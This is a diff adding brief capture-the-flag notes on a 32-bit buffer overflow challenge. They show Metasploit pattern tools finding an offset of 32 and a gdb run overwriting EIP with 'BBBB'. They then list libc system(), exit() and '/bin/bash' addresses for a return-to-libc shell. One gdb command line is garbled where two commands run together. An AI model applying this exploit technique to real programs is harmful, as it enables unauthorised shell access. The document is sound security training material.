@@ -1,0 +1,36 @@
+Buffer Overflow 5
+=================
+
+1. Buffer Overflow Fuzz
+
+root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x31624130
+[*] Exact match at offset 32
+
+
+2.  EIP Overwrite
+
+
+gdb$ run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Acrun $(python -c 'print "A" * 32 + "B" * 4')
+Starting program: /challenge/app-systeme/ch33/ch33 $(python -c 'print "A" * 32 + "B" * 4')
+Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00000000  EBX: 0xB7FD1000  ECX: 0x00000000  EDX: 0xB7FD2898  o d I t S z a P c 
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFFB60  EIP: 0x42424242
+  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
+Cannot access memory at address 0x42424242
+0x42424242 in ?? ()
+
+
+3. libc system return address
+
+0xb7e64310
+
+
+0xb7e64310 = system libc
+0xb7e57260 = exit()
+0xbffffd3b = /bin/bash
